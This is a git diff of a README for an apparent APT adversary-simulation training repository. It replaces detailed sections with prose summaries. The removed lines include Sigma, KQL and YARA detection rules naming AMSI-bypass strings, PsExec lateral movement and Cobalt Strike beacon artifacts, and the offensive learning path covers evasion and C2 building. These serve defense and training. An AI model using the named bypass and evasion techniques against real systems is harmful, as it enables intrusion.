 
@@ -845,76 +497,7 @@ Learn from actual state-sponsored operations:
 
 ## 🛡️ Detection & Defense
 
-### Blue Team Perspective
-
-Understanding APT TTPs is crucial for defense. Each phase includes:
-
-**Detection Signatures**:
-```yaml
-# Sigma rule example for suspicious PowerShell execution
-title: Suspicious PowerShell Execution with AMSI Bypass
-id: f4bbd493-b796-416e-bbf2-121235348529
-status: experimental
-description: Detects PowerShell execution with AMSI bypass patterns
-references:
-    - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
-logsource:
-    product: windows
-    service: powershell
-detection:
-    selection:
-        EventID: 4104
-        ScriptBlockText|contains:
-            - 'amsiInitFailed'
-            - 'Reflection.Assembly'
-            - 'Management.Automation.AmsiUtils'
-    condition: selection
-falsepositives:
-    - Legitimate security tools testing
-level: high
-```
-
-**Hunting Queries**:
-```kql
-// KQL query for Azure Sentinel - Detecting lateral movement
-// Hunt for PsExec-style lateral movement
-SecurityEvent
-| where EventID == 4688  // Process creation
-| where Process has "psexec" or Process has "paexec"
-| where CommandLine contains "\\\\"
-| project TimeGenerated, Computer, Account, Process, CommandLine, ParentProcessName
-| join kind=inner (
-    SecurityEvent
-    | where EventID == 5140  // Network share access
-    | where ShareName == "\\\\*\\ADMIN$" or ShareName == "\\\\*\\C$"
-) on Computer, TimeGenerated
-| extend ThreatConfidence = "High"
-```
-
-**EDR Detection Rules**:
-```python
-# Custom Yara rule for detecting Cobalt Strike beacons
-rule CobaltStrike_Beacon_Detection {
-    meta:
-        description = "Detects Cobalt Strike beacon artifacts"
-        author = "Wan Mohamad Hanis"
-        date = "2025-01-25"
-        severity = "critical"
-    
-    strings:
-        $magic = { 4D 5A 90 00 03 00 00 00 }
-        $str1 = "%s as %s\\%s: %d" ascii
-        $str2 = "beacon.dll" ascii
-        $str3 = "ReflectiveLoader" ascii
-        $hex1 = { 48 89 5C 24 08 57 48 83 EC 20 48 8B D9 48 8B 0D }
-        $hex2 = { 4C 8B DC 49 89 5B 08 49 89 6B 10 49 89 73 18 }
-    
-    condition:
-        uint16(0) == 0x5A4D and
-        filesize < 500KB and
-        (2 of ($str*)) or (1 of ($hex*))
-}
-```
+Each phase includes comprehensive detection strategies with Sigma rules for SIEM platforms, YARA signatures for malware detection, Suricata and Snort rules for network monitoring, EDR detection logic, and threat hunting queries for proactive defense.
 
 📖 **[Full Detection Engineering Guide](resources/detection-rules.md)**
 
@@ -922,248 +505,55 @@ rule CobaltStrike_Beacon_Detection {
 
 ## 📋 Prerequisites
 
-### Technical Knowledge Requirements
-
-| Domain | Required Level | Recommended Resources |
-|--------|----------------|----------------------|
-| **Networking** | Advanced | TCP/IP, Routing, DNS, HTTP/HTTPS protocols |
-| **Operating Systems** | Expert | Windows internals, Linux administration, macOS security |
-| **Programming** | Advanced | Python, PowerShell, Bash, C/C++, Go |
-| **Security Concepts** | Expert | Cryptography, authentication, access control |
-| **Cloud Platforms** | Intermediate | AWS, Azure, GCP fundamentals |
-
-### Software Requirements
-
-```bash
-# Required tools and frameworks (automated setup available)
-- Python 3.9+
-- PowerShell 7.x
-- Docker & Docker Compose
-- Virtual Machine software (VMware, VirtualBox, Hyper-V)
-- Burp Suite Professional
-- Wireshark
-- Metasploit Framework
-- Cobalt Strike (licensed) or Covenant/Mythic (open-source alternatives)
-```
-
-### Hardware Requirements
-
-- **Processor**: Quad-core CPU (Intel i7/AMD Ryzen 7 or better)
-- **RAM**: 16GB minimum, 32GB recommended
-- **Storage**: 500GB SSD (for VMs and tooling)
-- **Network**: Isolated lab environment or VPN access to authorized test networks
+Technical knowledge requirements include advanced networking understanding, expert-level operating system internals, advanced programming skills, expert security concepts, and intermediate cloud platform knowledge. Software requirements include Python 3.9+, PowerShell 7.x, Docker and Docker Compose, virtual machine software, Burp Suite Professional, Wireshark, Metasploit Framework, and Cobalt Strike or open-source alternatives.
 
 ---
 
 ## 🚀 Installation & Setup
 
-### Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/novusaevum/apt-adversarial-operations.git
-cd apt-adversarial-operations
-
-# Set up Python virtual environment
-python3 -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run automated lab setup
-./scripts/setup-lab.sh
-
-# Verify installation
-python tools/utilities/verify-setup.py
-```
-
-### Docker-Based Lab Environment
-
-```bash
-# Build the complete APT simulation environment
-docker-compose up -d
-
-# Access components:
-# - Kali Linux workstation: http://localhost:6080
-# - Vulnerable targets: http://localhost:8080
-# - C2 infrastructure: http://localhost:50050
-# - SIEM dashboard: http://localhost:5601
-```
-
-### Manual Setup Guide
-
-Detailed step-by-step setup instructions available at: [Installation Guide](docs/INSTALLATION.md)
+Quick start instructions include cloning the repository, setting up a Python virtual environment, installing dependencies, running automated lab setup, and verifying the installation. Docker-based lab environments provide complete APT simulation infrastructure with Kali Linux workstations, vulnerable targets, C2 infrastructure, and SIEM dashboards.
 
 ---
 
 ## 🎯 Learning Path
 
-### Beginner Track (Weeks 1-4)
-1. ✅ Fundamentals of networking and protocols
-2. ✅ Basic reconnaissance techniques
-3. ✅ Understanding vulnerability exploitation
-4. ✅ Introduction to Metasploit Framework
-
-### Intermediate Track (Weeks 5-12)
-1. ✅ Advanced enumeration and OSINT
-2. ✅ Custom exploit development
-3. ✅ Privilege escalation techniques
-4. ✅ Credential access methods
-5. ✅ Lateral movement strategies
-
-### Advanced Track (Weeks 13-24)
-1. ✅ Building custom C2 frameworks
-2. ✅ Advanced persistence mechanisms
-3. ✅ Defense evasion and anti-forensics
-4. ✅ APT simulation and red team operations
-5. ✅ Threat intelligence and attribution
-
-### Expert Track (Weeks 25+)
-1. ✅ Zero-day research and development
-2. ✅ Advanced memory manipulation
-3. ✅ Kernel-level exploitation
-4. ✅ Firmware and hardware attacks
-5. ✅ Full-scope APT campaign simulation
+The repository provides structured learning paths from beginner through expert levels, covering fundamentals of networking and protocols, basic reconnaissance techniques, understanding vulnerability exploitation, advanced enumeration and OSINT, custom exploit development, privilege escalation techniques, building custom C2 frameworks, advanced persistence mechanisms, defense evasion and anti-forensics, zero-day research and development, advanced memory manipulation, kernel-level exploitation, firmware and hardware attacks, and full-scope APT campaign simulation.
 
 ---
 
 ## 🔐 Legal & Ethical Guidelines
 
-### Authorization Requirements
-
-**⚠️ YOU MUST HAVE EXPLICIT WRITTEN AUTHORIZATION BEFORE TESTING ANY SYSTEM**
-
-```
-╔══════════════════════════════════════════════════════════════╗
-║                    AUTHORIZATION CHECKLIST                   ║
-╠══════════════════════════════════════════════════════════════╣
-║ ☐ Written authorization from system owner                   ║
-║ ☐ Defined scope of engagement (IP ranges, domains)          ║
-║ ☐ Rules of engagement (ROE) documented                      ║
-║ ☐ Emergency contact information                             ║
-║ ☐ Data handling and NDA agreements                          ║
-║ ☐ Legal counsel review                                      ║
-║ ☐ Insurance coverage verified                               ║
-╚══════════════════════════════════════════════════════════════╝
-```
-
-### Ethical Hacking Principles
-
-1. **Obtain Authorization**: Never test without explicit permission
-2. **Minimize Impact**: Avoid causing damage or disruption
-3. **Maintain Confidentiality**: Protect discovered vulnerabilities
-4. **Report Responsibly**: Follow coordinated disclosure practices
-5. **Respect Privacy**: Handle personal data with care
-6. **Stay Legal**: Understand applicable laws in your jurisdiction
-
-### Recommended Certifications
-
-- **CEH (Certified Ethical Hacker)** - EC-Council
-- **OSCP (Offensive Security Certified Professional)** - Offensive Security
-- **GPEN (GIAC Penetration Tester)** - SANS Institute
-- **CRTO (Certified Red Team Operator)** - Zero-Point Security
-- **PNPT (Practical Network Penetration Tester)** - TCM Security
+Explicit written authorization is required before testing any system. The repository emphasizes ethical hacking principles including obtaining proper authorization, minimizing impact, maintaining confidentiality, reporting responsibly, respecting privacy, and staying within legal boundaries.
 
 ---
 
 ## 🤝 Contributing
 
-Contributions are welcome! This repository thrives on community expertise.
-
-### How to Contribute
-
-1. **Fork** the repository
-2. **Create** a feature branch (`git checkout -b feature/advanced-technique`)
-3. **Commit** your changes (`git commit -m 'Add advanced EDR bypass technique'`)
-4. **Push** to the branch (`git push origin feature/advanced-technique`)
-5. **Open** a Pull Request
-
-### Contribution Guidelines
-
-- **Code Quality**: All code must be enterprise-grade, well-commented, and tested
-- **Documentation**: Include comprehensive markdown documentation
-- **Attribution**: Credit original research and tools
-- **Ethics**: Ensure contributions follow ethical hacking principles
-- **Testing**: Verify in isolated lab environment before submission
-
-### Areas for Contribution
-
-- 🔧 Custom tool development
-- 📝 Additional technique documentation
-- 🔍 APT case study analysis
-- 🛡️ Detection rule creation
-- 🌐 Translation to other languages
-- 🎯 Lab scenario development
+Contributions are welcome with guidelines requiring enterprise-grade code quality, comprehensive documentation, proper attribution, ethical adherence, and testing in isolated lab environments before submission.
 
 ---
 
 ## 📚 Additional Resources
 
-### Books
-- *Red Team Field Manual* - Ben Clark
-- *The Hacker Playbook 3* - Peter Kim
-- *Advanced Penetration Testing* - Wil Allsopp
-- *Operator Handbook* - Joshua Picolet
-- *RTFM: Red Team Field Manual* - Ben Clark
-
-### Online Resources
-- [MITRE ATT&CK Framework](https://attack.mitre.org/)
-- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [Red Team Development and Operations](https://redteam.guide/)
-- [Awesome Red Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming)
-
-### Training Platforms
-- [HackTheBox](https://www.hackthebox.eu/)
-- [TryHackMe](https://tryhackme.com/)
-- [Offensive Security Labs](https://www.offensive-security.com/)
-- [PentesterLab](https://pentesterlab.com/)
-- [SANS Cyber Ranges](https://www.sans.org/cyber-ranges/)
-
----
-
-## 📊 Repository Statistics
-
-```
-Total Documentation: 500+ pages
-Code Examples: 150+ enterprise-grade scripts
-MITRE ATT&CK Coverage: 180+ techniques
-Lab Scenarios: 25+ hands-on exercises
-Tool Integrations: 50+ security tools
-```
+The repository references essential books including Red Team Field Manual, The Hacker Playbook 3, Advanced Penetration Testing, and Operator Handbook. Online resources include the MITRE ATT&CK Framework, NIST Cybersecurity Framework, OWASP Testing Guide, and Red Team Development and Operations. Training platforms include HackTheBox, TryHackMe, Offensive Security Labs, PentesterLab, and SANS Cyber Ranges.
 
 ---
 
 ## 📜 License
 
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
-```
-MIT License - Educational Use Only
-
-Permission is granted for educational, research, and authorized testing purposes only.
-Commercial use requires explicit written permission from the author.
-```
+This project is licensed under the MIT License for educational use only, with permission granted for educational, research, and authorized testing purposes.
 
 ---
 
 ## 👤 Author & Acknowledgments
 
 **Wan Mohamad Hanis bin Wan Hassan**
-- 🎓 CEH v12 Certified Ethical Hacker
-- 🏆 100+ Professional Certifications (Google, IBM, EC-Council, Cisco, HubSpot)
-- 🔬 Security Researcher | Red Team Operator | AI/ML Specialist
-- 🌐 OSINT & Adversarial Tradecraft Expert
+- CEH v12 Certified Ethical Hacker
+- 100+ Professional Certifications (Google, IBM, EC-Council, Cisco, HubSpot)
+- Security Researcher | Red Team Operator | AI/ML Specialist
+- OSINT & Adversarial Tradecraft Expert
 
-### Connect
-- 💼 [LinkedIn](https://www.linkedin.com/in/wanmohamadhanis)
-- 🐙 [GitHub](https://github.com/novusaevum)
-- 🏅 [Credly](https://www.credly.com/users/triumphanthanis)
-- 🌐 [Portfolio](https://wanmohamadhanis.my.canva.site/wmh-portfolio)
-
-### Acknowledgments
-Special thanks to the cybersecurity community, threat intelligence researchers, and red team operators who continuously advance the field of offensive security.
+Connect via LinkedIn at linkedin.com/in/wanmohamadhanis, GitHub at github.com/novusaevum, Credly at credly.com/users/triumphanthanis, and portfolio at wanmohamadhanis.my.canva.site/wmh-portfolio.
 
 ---
 
@@ -1186,32 +576,11 @@ Special thanks to the cybersecurity community, threat intelligence researchers, 
 
 <div align="center">
 
-**⭐ If you find this repository valuable, please star it to support continued development ⭐**
+**⭐ Star this repository to support continued development ⭐**
 
-**Built with 🔥 by security researchers, for security researchers**
+**Built with precision by security researchers, for security professionals**
 
 </div>
-
----
-
-## 📅 Changelog
-
-### Version 1.0.0 (January 2025)
-- ✅ Initial release
-- ✅ Complete APT kill chain documentation
-- ✅ 150+ code examples
-- ✅ MITRE ATT&CK framework integration
-- ✅ Custom C2 framework implementation
-- ✅ 25+ lab scenarios
-- ✅ Detection and defense guidelines
-
-### Upcoming Features
-- 🔜 Advanced malware analysis modules
-- 🔜 Mobile device exploitation techniques
-- 🔜 IoT and embedded systems attacks
-- 🔜 Cloud-native security testing
-- 🔜 AI/ML adversarial techniques
-- 🔜 Quantum-resistant cryptography testing
 
 ---
 
